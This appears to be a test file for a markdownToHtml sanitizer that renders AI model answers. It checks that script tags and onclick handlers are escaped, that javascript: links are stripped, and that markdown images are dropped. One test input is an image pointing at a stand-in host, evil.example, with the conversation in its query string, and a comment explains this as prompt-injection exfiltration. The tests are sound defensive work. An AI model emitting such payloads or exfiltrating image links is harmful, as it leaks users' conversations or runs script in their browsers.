import { strict as assert } from "node:assert";
import { describe, it } from "node:test";

import { markdownToHtml } from "../src/run/markdownToHtml";

describe("markdownToHtml (a model's answer, formatted)", () => {
  it("formats what models usually write: headings, lists, emphasis, code", () => {
    const html = markdownToHtml("# Plan\n\n- **one**\n- `two`\n\n```js\nconst x = 1;\n```");
    assert.match(html, /<h1>Plan<\/h1>/);
    assert.match(html, /<li><strong>one<\/strong><\/li>/);
    assert.match(html, /<code>two<\/code>/);
    assert.match(html, /<pre><code class="language-js">const x = 1;/);
  });

  it("shows raw HTML in an answer as text instead of rendering it", () => {
    const html = markdownToHtml('Hi <script>alert(1)</script> <b onclick="x()">there</b>');
    assert.doesNotMatch(html, /<script|<b /);
    assert.match(html, /(&lt;|&#60;)script(&gt;|&#62;)/, "the tag is still there, as text");
  });

  it("drops images — loading one would send its URL (and whatever an injected prompt put in it) away", () => {
    const html = markdownToHtml("![chart](https://evil.example/log?q=the+conversation)");
    assert.doesNotMatch(html, /<img|evil\.example/);
    assert.match(html, /chart/);
  });

  it("links only to web and mail addresses, in a new tab without a referrer", () => {
    assert.match(
      markdownToHtml("[docs](https://example.com)"),
      /<a href="https:\/\/example\.com" target="_blank" rel="noopener noreferrer">docs<\/a>/
    );
    const script = markdownToHtml("[click](javascript:alert(1))");
    assert.doesNotMatch(script, /href/);
    assert.match(script, /click/);
  });
});
